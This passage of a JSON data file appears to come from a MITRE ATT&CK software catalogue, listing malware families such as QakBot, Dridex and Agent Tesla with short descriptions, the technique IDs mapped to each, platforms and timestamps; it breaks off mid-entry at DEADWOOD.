    "S0186": {
      "id": "S0186",
      "name": "DownPaper",
      "description": "[DownPaper](https://attack.mitre.org/software/S0186) is a backdoor Trojan; its main functionality is to download and run second stage malware. (Citation: ClearSky Charming Kitten Dec 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1012",
        "T1033",
        "T1547.001",
        "T1071.001",
        "T1059.001",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0186",
      "stix_id": "malware--e48df773-7c95-4a4c-ba70-ea3d15900148",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:44:56.608000+00:00"
    },
    "S0273": {
      "id": "S0273",
      "name": "Socksbot",
      "description": "[Socksbot](https://attack.mitre.org/software/S0273) is a backdoor that  abuses Socket Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055.001",
        "T1059.001",
        "T1090",
        "T1113",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0273",
      "stix_id": "malware--e494ad79-37ee-4cd0-866b-299c521d8b94",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:44:56.967000+00:00"
    },
    "S1102": {
      "id": "S1102",
      "name": "Pcexter",
      "description": "[Pcexter](https://attack.mitre.org/software/S1102) is an uploader that has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) since at least 2023 to exfiltrate stolen files.(Citation: Kaspersky ToddyCat Check Logs October 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1567.002",
        "T1574.001",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1102",
      "stix_id": "malware--e4feffc2-53d1-45c9-904e-adb9faca0d15",
      "created": "2024-01-22T19:21:29.473000+00:00",
      "modified": "2024-01-22T19:21:48.480000+00:00"
    },
    "S0135": {
      "id": "S0135",
      "name": "HIDEDRV",
      "description": "[HIDEDRV](https://attack.mitre.org/software/S0135) is a rootkit used by [APT28](https://attack.mitre.org/groups/G0007). It has been deployed along with [Downdelph](https://attack.mitre.org/software/S0134) to execute and hide that malware. (Citation: ESET Sednit Part 3) (Citation: Sekoia HideDRV Oct 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1014",
        "T1055.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0135",
      "stix_id": "malware--e669bb87-f773-4c7b-bfcc-a9ffebfdd8d4",
      "created": "2017-05-31T21:33:17.272000+00:00",
      "modified": "2024-11-17T18:07:17.216000+00:00"
    },
    "S0046": {
      "id": "S0046",
      "name": "CozyCar",
      "description": "[CozyCar](https://attack.mitre.org/software/S0046) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2010 to 2015. It is a modular malware platform, and its backdoor component can be instructed to download and execute a variety of modules with different functionality. (Citation: F-Secure The Dukes)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1082",
        "T1071.001",
        "T1102.002",
        "T1547.001",
        "T1518.001",
        "T1218.011",
        "T1003.001",
        "T1497",
        "T1027.013",
        "T1003.002",
        "T1036.003",
        "T1053.005",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0046",
      "stix_id": "malware--e6ef745b-077f-42e1-a37d-29eecff9c754",
      "created": "2017-05-31T21:32:35.022000+00:00",
      "modified": "2024-04-11T02:44:33.881000+00:00"
    },
    "S1020": {
      "id": "S1020",
      "name": "Kevin",
      "description": "[Kevin](https://attack.mitre.org/software/S1020) is a backdoor implant written in C++ that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2020, including in operations against organizations in Tunisia.(Citation: Kaspersky Lyceum October 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.004",
        "T1564.003",
        "T1016",
        "T1132.001",
        "T1082",
        "T1105",
        "T1041",
        "T1572",
        "T1030",
        "T1070.004",
        "T1071.001",
        "T1106",
        "T1005",
        "T1059.003",
        "T1001.001",
        "T1027.013",
        "T1074",
        "T1546.003",
        "T1008",
        "T1497",
        "T1036.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1020",
      "stix_id": "malware--e7863f5d-cb6a-4f81-8804-0a635eec160a",
      "created": "2022-06-14T14:27:43.651000+00:00",
      "modified": "2024-04-17T22:07:06.736000+00:00"
    },
    "S0331": {
      "id": "S0331",
      "name": "Agent Tesla",
      "description": "[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written for the .NET framework that has been observed since at least 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055",
        "T1497",
        "T1115",
        "T1566.001",
        "T1113",
        "T1087.001",
        "T1547.001",
        "T1552.001",
        "T1047",
        "T1204.002",
        "T1203",
        "T1016",
        "T1218.009",
        "T1124",
        "T1033",
        "T1105",
        "T1057",
        "T1555.003",
        "T1125",
        "T1027",
        "T1185",
        "T1071.001",
        "T1048.003",
        "T1564.003",
        "T1056.001",
        "T1053.005",
        "T1564.001",
        "T1140",
        "T1555",
        "T1082",
        "T1562.001",
        "T1560",
        "T1071.003",
        "T1112",
        "T1055.012",
        "T1552.002",
        "T1016.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0331",
      "stix_id": "malware--e7a5229f-05eb-440e-b982-9a6d2b2b87c8",
      "created": "2019-01-29T18:44:04.748000+00:00",
      "modified": "2025-04-16T20:38:40.678000+00:00"
    },
    "S0208": {
      "id": "S0208",
      "name": "Pasam",
      "description": "[Pasam](https://attack.mitre.org/software/S0208) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam May 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1105",
        "T1083",
        "T1547.008",
        "T1082",
        "T1070.004",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0208",
      "stix_id": "malware--e811ff6a-4cef-4856-a6ae-a7daf9ed39ae",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.592000+00:00"
    },
    "S0068": {
      "id": "S0068",
      "name": "httpclient",
      "description": "[httpclient](https://attack.mitre.org/software/S0068) is malware used by [Putter Panda](https://attack.mitre.org/groups/G0024). It is a simple tool that provides a limited range of functionality, suggesting it is likely used as a second-stage or supplementary/backup tool. (Citation: CrowdStrike Putter Panda)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1071.001",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0068",
      "stix_id": "malware--e8268361-a599-4e45-bd3f-71c8c7e700c0",
      "created": "2017-05-31T21:32:45.315000+00:00",
      "modified": "2025-04-25T14:44:58.407000+00:00"
    },
    "S0223": {
      "id": "S0223",
      "name": "POWERSTATS",
      "description": "[POWERSTATS](https://attack.mitre.org/software/S0223) is a PowerShell-based first stage backdoor used by [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1559.001",
        "T1140",
        "T1033",
        "T1562.001",
        "T1036.004",
        "T1087.001",
        "T1518.001",
        "T1218.005",
        "T1047",
        "T1029",
        "T1082",
        "T1132.001",
        "T1090.002",
        "T1559.002",
        "T1059.001",
        "T1016",
        "T1005",
        "T1053.005",
        "T1573.002",
        "T1027.010",
        "T1070.004",
        "T1059.005",
        "T1059.007",
        "T1105",
        "T1113",
        "T1027.016",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0223",
      "stix_id": "malware--e8545794-b98c-492b-a5b3-4b5a02682e37",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2025-04-16T20:38:40.984000+00:00"
    },
    "S0371": {
      "id": "S0371",
      "name": "POWERTON",
      "description": "[POWERTON](https://attack.mitre.org/software/S0371) is a custom PowerShell backdoor first observed in 2018. It has typically been deployed as a late-stage backdoor by [APT33](https://attack.mitre.org/groups/G0064). At least two variants of the backdoor have been identified, with the later version containing improved functionality.(Citation: FireEye APT33 Guardrail)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1071.001",
        "T1059.001",
        "T1003.002",
        "T1547.001",
        "T1546.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0371",
      "stix_id": "malware--e85cae1a-bce3-4ac4-b36b-b00acac0567b",
      "created": "2019-04-16T17:43:42.724000+00:00",
      "modified": "2025-04-25T14:44:58.949000+00:00"
    },
    "S0593": {
      "id": "S0593",
      "name": "ECCENTRICBANDWAGON",
      "description": "[ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) is a remote access Trojan (RAT) used by North Korean cyber actors that was first identified in August 2020. It is a reconnaissance tool--with keylogging and screen capture functionality--used for information gathering on compromised systems.(Citation: CISA EB Aug 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1027",
        "T1059.003",
        "T1113",
        "T1056.001",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0593",
      "stix_id": "malware--e928333f-f3df-4039-9b8b-556c2add0e42",
      "created": "2021-03-18T16:15:53.977000+00:00",
      "modified": "2025-04-25T14:44:59.309000+00:00"
    },
    "S0128": {
      "id": "S0128",
      "name": "BADNEWS",
      "description": "[BADNEWS](https://attack.mitre.org/software/S0128) is malware that has been used by the actors responsible for the [Patchwork](https://attack.mitre.org/groups/G0040) campaign. Its name was given due to its use of RSS feeds, forums, and blogs for command and control. (Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.001",
        "T1071.001",
        "T1113",
        "T1005",
        "T1573.001",
        "T1574.001",
        "T1132",
        "T1056.001",
        "T1102.002",
        "T1036.001",
        "T1119",
        "T1053.005",
        "T1039",
        "T1132.001",
        "T1547.001",
        "T1025",
        "T1059.003",
        "T1055.012",
        "T1105",
        "T1036.005",
        "T1106",
        "T1074.001",
        "T1083",
        "T1120"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0128",
      "stix_id": "malware--e9595678-d269-469e-ae6b-75e49259de63",
      "created": "2017-05-31T21:33:14.118000+00:00",
      "modified": "2025-04-25T14:44:59.677000+00:00"
    },
    "S0211": {
      "id": "S0211",
      "name": "Linfo",
      "description": "[Linfo](https://attack.mitre.org/software/S0211) is a rootkit trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo May 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1008",
        "T1105",
        "T1083",
        "T1070.004",
        "T1029",
        "T1059.003",
        "T1057",
        "T1005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0211",
      "stix_id": "malware--e9e9bfe2-76f4-4870-a2a1-b7af89808613",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.593000+00:00"
    },
    "S0477": {
      "id": "S0477",
      "name": "Goopy",
      "description": "[Goopy](https://attack.mitre.org/software/S0477) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050) and shares several similarities to another backdoor used by the group ([Denis](https://attack.mitre.org/software/S0354)). [Goopy](https://attack.mitre.org/software/S0477) is named for its impersonation of the legitimate Google Updater executable.(Citation: Cybereason Cobalt Kitty 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.004",
        "T1059.005",
        "T1027.016",
        "T1059.003",
        "T1033",
        "T1562.001",
        "T1071.001",
        "T1057",
        "T1070.008",
        "T1005",
        "T1106",
        "T1071.003",
        "T1140",
        "T1574.001",
        "T1041",
        "T1036.005",
        "T1053.005",
        "T1027.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0477",
      "stix_id": "malware--eac3d77f-2b7b-4599-ba74-948dc16633ad",
      "created": "2020-06-19T20:42:19.258000+00:00",
      "modified": "2025-04-16T20:38:41.645000+00:00"
    },
    "S0596": {
      "id": "S0596",
      "name": "ShadowPad",
      "description": "[ShadowPad](https://attack.mitre.org/software/S0596) is a modular backdoor that was first identified in a supply chain compromise of the NetSarang software in mid-July 2017. The malware was originally thought to be exclusively used by [APT41](https://attack.mitre.org/groups/G0096), but has since been observed to be used by various Chinese threat activity groups. (Citation: Recorded Future RedEcho Feb 2021)(Citation: Securelist ShadowPad Aug 2017)(Citation: Kaspersky ShadowPad Aug 2017) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1112",
        "T1124",
        "T1070",
        "T1140",
        "T1027.011",
        "T1016",
        "T1029",
        "T1057",
        "T1071.004",
        "T1132.002",
        "T1071.002",
        "T1095",
        "T1027",
        "T1071.001",
        "T1055",
        "T1082",
        "T1568.002",
        "T1105",
        "T1055.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0596",
      "stix_id": "malware--ec9e00dd-0313-4d5b-8105-c20aa47abffc",
      "created": "2021-03-23T20:49:39.954000+00:00",
      "modified": "2025-04-16T20:38:41.797000+00:00"
    },
    "S0375": {
      "id": "S0375",
      "name": "Remexi",
      "description": "[Remexi](https://attack.mitre.org/software/S0375) is a Windows-based Trojan that was developed in the C programming language.(Citation: Securelist Remexi Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1059.003",
        "T1056.001",
        "T1041",
        "T1027.013",
        "T1115",
        "T1547.001",
        "T1071.001",
        "T1047",
        "T1140",
        "T1547.004",
        "T1010",
        "T1560",
        "T1059.005",
        "T1113",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0375",
      "stix_id": "malware--ecc2f65a-b452-4eaf-9689-7e181f17f7a5",
      "created": "2019-04-17T19:18:00.270000+00:00",
      "modified": "2024-04-11T00:17:12.008000+00:00"
    },
    "S0373": {
      "id": "S0373",
      "name": "Astaroth",
      "description": "[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe, Brazil, and throughout Latin America. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102.001",
        "T1124",
        "T1564.003",
        "T1027.013",
        "T1115",
        "T1082",
        "T1497.001",
        "T1129",
        "T1059.005",
        "T1057",
        "T1204.002",
        "T1140",
        "T1132.001",
        "T1027.002",
        "T1218.010",
        "T1518.001",
        "T1566.001",
        "T1056.001",
        "T1574.001",
        "T1059.007",
        "T1041",
        "T1220",
        "T1016",
        "T1055.012",
        "T1547.009",
        "T1047",
        "T1555",
        "T1105",
        "T1552",
        "T1027.010",
        "T1564.004",
        "T1547.001",
        "T1218.001",
        "T1568.002",
        "T1059.003",
        "T1074.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0373",
      "stix_id": "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6",
      "created": "2019-04-17T13:46:38.565000+00:00",
      "modified": "2024-09-25T15:03:49.408000+00:00"
    },
    "S0650": {
      "id": "S0650",
      "name": "QakBot",
      "description": "[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1218.010",
        "T1564.001",
        "T1497.001",
        "T1018",
        "T1005",
        "T1090.002",
        "T1059.001",
        "T1059.003",
        "T1518.001",
        "T1106",
        "T1027.001",
        "T1543.003",
        "T1568.002",
        "T1083",
        "T1547.001",
        "T1027.011",
        "T1036.008",
        "T1135",
        "T1055.012",
        "T1059.007",
        "T1218.007",
        "T1140",
        "T1114.001",
        "T1204.001",
        "T1124",
        "T1204.002",
        "T1041",
        "T1033",
        "T1027.006",
        "T1016.001",
        "T1573.001",
        "T1027.010",
        "T1071.001",
        "T1553.002",
        "T1027",
        "T1210",
        "T1057",
        "T1069.001",
        "T1574.001",
        "T1016",
        "T1539",
        "T1055",
        "T1482",
        "T1074.001",
        "T1110",
        "T1553.005",
        "T1185",
        "T1497.003",
        "T1105",
        "T1120",
        "T1095",
        "T1566.002",
        "T1027.005",
        "T1112",
        "T1566.001",
        "T1056.001",
        "T1091",
        "T1132.001",
        "T1059.005",
        "T1082",
        "T1047",
        "T1010",
        "T1518",
        "T1049",
        "T1053.005",
        "T1218.011",
        "T1572",
        "T1555.003",
        "T1027.002",
        "T1562.001",
        "T1070.004"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0650",
      "stix_id": "malware--edc5e045-5401-42bb-ad92-52b5b2ee0de9",
      "created": "2021-09-27T19:35:35.326000+00:00",
      "modified": "2024-11-17T13:02:32.758000+00:00"
    },
    "S0464": {
      "id": "S0464",
      "name": "SYSCON",
      "description": "[SYSCON](https://attack.mitre.org/software/S0464) is a backdoor that has been in use since at least 2017 and has been associated with campaigns involving North Korean themes. [SYSCON](https://attack.mitre.org/software/S0464) has been delivered by the [CARROTBALL](https://attack.mitre.org/software/S0465) and [CARROTBAT](https://attack.mitre.org/software/S0462) droppers.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1059.003",
        "T1204.002",
        "T1057",
        "T1071.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0464",
      "stix_id": "malware--edf5aee2-9b1c-4252-8e64-25b12f14c8b3",
      "created": "2020-06-02T18:46:58.489000+00:00",
      "modified": "2025-04-16T20:38:41.948000+00:00"
    },
    "S0492": {
      "id": "S0492",
      "name": "CookieMiner",
      "description": "[CookieMiner](https://attack.mitre.org/software/S0492) is mac-based malware that targets information associated with cryptocurrency exchanges as well as enabling cryptocurrency mining on the victim system itself. It was first discovered in the wild in 2019.(Citation: Unit42 CookieMiner Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1555.003",
        "T1048.003",
        "T1496.001",
        "T1539",
        "T1083",
        "T1105",
        "T1140",
        "T1562.004",
        "T1005",
        "T1518.001",
        "T1027.010",
        "T1059.004",
        "T1543.001",
        "T1059.006"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0492",
      "stix_id": "malware--eedc01d5-95e6-4d21-bcd4-1121b1df4586",
      "created": "2020-07-22T19:00:00.779000+00:00",
      "modified": "2025-04-16T20:38:42.106000+00:00"
    },
    "S0499": {
      "id": "S0499",
      "name": "Hancitor",
      "description": "[Hancitor](https://attack.mitre.org/software/S0499) is a downloader that has been used by [Pony](https://attack.mitre.org/software/S0453) and other information stealing malware.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1204.002",
        "T1218.012",
        "T1027.015",
        "T1105",
        "T1204.001",
        "T1106",
        "T1566.001",
        "T1547.001",
        "T1059.001",
        "T1566.002",
        "T1027",
        "T1070.004",
        "T1497",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0499",
      "stix_id": "malware--ef2247bf-8062-404b-894f-d65d00564817",
      "created": "2020-08-12T19:32:56.301000+00:00",
      "modified": "2025-04-25T14:45:01.455000+00:00"
    },
    "S0666": {
      "id": "S0666",
      "name": "Gelsemium",
      "description": "[Gelsemium](https://attack.mitre.org/software/S0666) is a modular malware comprised of a dropper (Gelsemine), a loader (Gelsenicine), and main (Gelsevirine) plug-ins written using the Microsoft Foundation Class (MFC) framework. [Gelsemium](https://attack.mitre.org/software/S0666) has been used by the Gelsemium group since at least 2014.(Citation: ESET Gelsemium June 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1568",
        "T1140",
        "T1548.002",
        "T1095",
        "T1543.003",
        "T1070.004",
        "T1620",
        "T1547.012",
        "T1547.001",
        "T1497",
        "T1027.011",
        "T1112",
        "T1057",
        "T1071.004",
        "T1083",
        "T1082",
        "T1518.001",
        "T1105",
        "T1033",
        "T1008",
        "T1005",
        "T1055.001",
        "T1134",
        "T1070.006",
        "T1012",
        "T1106",
        "T1071.001",
        "T1059.003",
        "T1036.001",
        "T1027.016",
        "T1027.015",
        "T1036.005",
        "T1559.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0666",
      "stix_id": "malware--efa7c4d6-8e30-41d9-a8fd-26dc337f4a1b",
      "created": "2021-11-30T19:02:16.138000+00:00",
      "modified": "2024-04-11T02:28:01.735000+00:00"
    },
    "S0283": {
      "id": "S0283",
      "name": "jRAT",
      "description": "[jRAT](https://attack.mitre.org/software/S0283) is a cross-platform, Java-based backdoor originally available for purchase in 2012. Variants of [jRAT](https://attack.mitre.org/software/S0283) have been distributed via a software-as-a-service platform, similar to an online subscription model.(Citation: Kaspersky Adwind Feb 2016) (Citation: jRAT Symantec Aug 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1056.001",
        "T1120",
        "T1029",
        "T1047",
        "T1059.005",
        "T1125",
        "T1059.003",
        "T1007",
        "T1070.004",
        "T1082",
        "T1037.005",
        "T1105",
        "T1057",
        "T1083",
        "T1021.001",
        "T1555.003",
        "T1027.002",
        "T1518.001",
        "T1090",
        "T1059.007",
        "T1115",
        "T1552.001",
        "T1123",
        "T1113",
        "T1049",
        "T1027",
        "T1016",
        "T1552.004"
      ],
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "Android"
      ],
      "url": "https://attack.mitre.org/software/S0283",
      "stix_id": "malware--efece7e8-e40b-49c2-9f84-c55c5c93d05c",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2023-10-03T19:38:43.114000+00:00"
    },
    "S0170": {
      "id": "S0170",
      "name": "Helminth",
      "description": "[Helminth](https://attack.mitre.org/software/S0170) is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable. (Citation: Palo Alto OilRig May 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1053.005",
        "T1553.002",
        "T1027.013",
        "T1547.001",
        "T1573.001",
        "T1547.009",
        "T1071.004",
        "T1071.001",
        "T1059.001",
        "T1057",
        "T1059.005",
        "T1056.001",
        "T1105",
        "T1074.001",
        "T1115",
        "T1059.003",
        "T1069.001",
        "T1069.002",
        "T1119",
        "T1132.001",
        "T1030"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0170",
      "stix_id": "malware--eff1a885-6f90-42a1-901f-eef6e7a1905e",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-04-11T02:22:38.177000+00:00"
    },
    "S0384": {
      "id": "S0384",
      "name": "Dridex",
      "description": "[Dridex](https://attack.mitre.org/software/S0384) is a prolific banking Trojan that first appeared in 2014. By December 2019, the US Treasury estimated [Dridex](https://attack.mitre.org/software/S0384) had infected computers in hundreds of banks and financial institutions in over 40 countries, leading to more than $100 million in theft. [Dridex](https://attack.mitre.org/software/S0384) was created from the source code of the Bugat banking Trojan (also known as Cridex).(Citation: Dell Dridex Oct 2015)(Citation: Kaspersky Dridex May 2017)(Citation: Treasury EvilCorp Dec 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1574.001",
        "T1219",
        "T1106",
        "T1053.005",
        "T1185",
        "T1518",
        "T1071.001",
        "T1218.010",
        "T1573.002",
        "T1027",
        "T1090",
        "T1082",
        "T1090.003",
        "T1204.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0384",
      "stix_id": "malware--f01e2711-4b48-4192-a2e8-5f56c945ca19",
      "created": "2019-05-30T19:47:37.192000+00:00",
      "modified": "2025-04-16T20:38:42.420000+00:00"
    },
    "S0470": {
      "id": "S0470",
      "name": "BBK",
      "description": "[BBK](https://attack.mitre.org/software/S0470) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1055",
        "T1027.003",
        "T1105",
        "T1071.001",
        "T1140",
        "T1059.003",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0470",
      "stix_id": "malware--f0fc920e-57a3-4af5-89be-9ea594c8b1ea",
      "created": "2020-06-10T18:00:28.497000+00:00",
      "modified": "2025-04-25T14:45:02.531000+00:00"
    },
    "S0162": {
      "id": "S0162",
      "name": "Komplex",
      "description": "[Komplex](https://attack.mitre.org/software/S0162) is a backdoor that has been used by [APT28](https://attack.mitre.org/groups/G0007) on OS X and appears to be developed in a similar manner to [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX 2017) (Citation: Sofacy Komplex Trojan).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1033",
        "T1057",
        "T1573.001",
        "T1071.001",
        "T1543.001",
        "T1564.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0162",
      "stix_id": "malware--f108215f-3487-489d-be8b-80e346d32518",
      "created": "2017-12-14T16:46:06.044000+00:00",
      "modified": "2025-04-25T14:45:02.893000+00:00"
    },
    "S0402": {
      "id": "S0402",
      "name": "OSX/Shlayer",
      "description": "[OSX/Shlayer](https://attack.mitre.org/software/S0402) is a Trojan designed to install adware on macOS that was first discovered in 2018.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564",
        "T1564.001",
        "T1222.002",
        "T1204.002",
        "T1176.001",
        "T1553.001",
        "T1059.004",
        "T1564.011",
        "T1140",
        "T1036.005",
        "T1564.009",
        "T1083",
        "T1082",
        "T1105",
        "T1548.004"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0402",
      "stix_id": "malware--f1314e75-ada8-49f4-b281-b1fb8b48f2a7",
      "created": "2019-08-29T18:52:20.879000+00:00",
      "modified": "2025-04-16T20:38:42.935000+00:00"
    },
    "S0354": {
      "id": "S0354",
      "name": "Denis",
      "description": "[Denis](https://attack.mitre.org/software/S0354) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050). [Denis](https://attack.mitre.org/software/S0354) shares several similarities to the [SOUNDBITE](https://attack.mitre.org/software/S0157) backdoor and has been used in conjunction with the [Goopy](https://attack.mitre.org/software/S0477) backdoor.(Citation: Cybereason Oceanlotus May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.004",
        "T1070.004",
        "T1497.001",
        "T1105",
        "T1055.012",
        "T1082",
        "T1012",
        "T1140",
        "T1027.010",
        "T1016",
        "T1132.001",
        "T1560.002",
        "T1574",
        "T1083",
        "T1106",
        "T1059.001",
        "T1033",
        "T1574.001",
        "T1027",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0354",
      "stix_id": "malware--f25aab1a-0cef-4910-a85d-bb38b32ea41a",
      "created": "2019-01-30T20:01:44.815000+00:00",
      "modified": "2025-04-16T20:38:43.085000+00:00"
    },
    "S1139": {
      "id": "S1139",
      "name": "INC Ransomware",
      "description": "[INC Ransomware](https://attack.mitre.org/software/S1139) is a ransomware strain that has been used by the [INC Ransom](https://attack.mitre.org/groups/G1032) group since at least 2023 against multiple industry sectors worldwide. [INC Ransomware](https://attack.mitre.org/software/S1139) can employ partial encryption combined with multi-threading to speed encryption.(Citation: SentinelOne INC Ransomware)(Citation: Huntress INC Ransom Group August 2023)(Citation: Secureworks GOLD IONIC April 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1120",
        "T1570",
        "T1566",
        "T1106",
        "T1652",
        "T1490",
        "T1047",
        "T1082",
        "T1135",
        "T1486",
        "T1140",
        "T1083",
        "T1057",
        "T1489",
        "T1491.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1139",
      "stix_id": "malware--f25d4207-25b2-4bb0-a17a-403943c670ad",
      "created": "2024-06-06T18:28:58.878000+00:00",
      "modified": "2024-10-28T19:03:40.175000+00:00"
    },
    "S1134": {
      "id": "S1134",
      "name": "DEADWOOD",
      "description": "[DEADWOOD](https://attack.mitre.org/software/S1134) is wiper malware written in C++ using Boost libraries. [DEADWOOD](https://attack.mitre.org/software/S1134) was first observed in an unattributed wiping event in Saudi Arabia in 2019, and has since been incorporated into [Agrius](https://attack.mitre.org/groups/G1030) operations.(Citation: SentinelOne Agrius 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
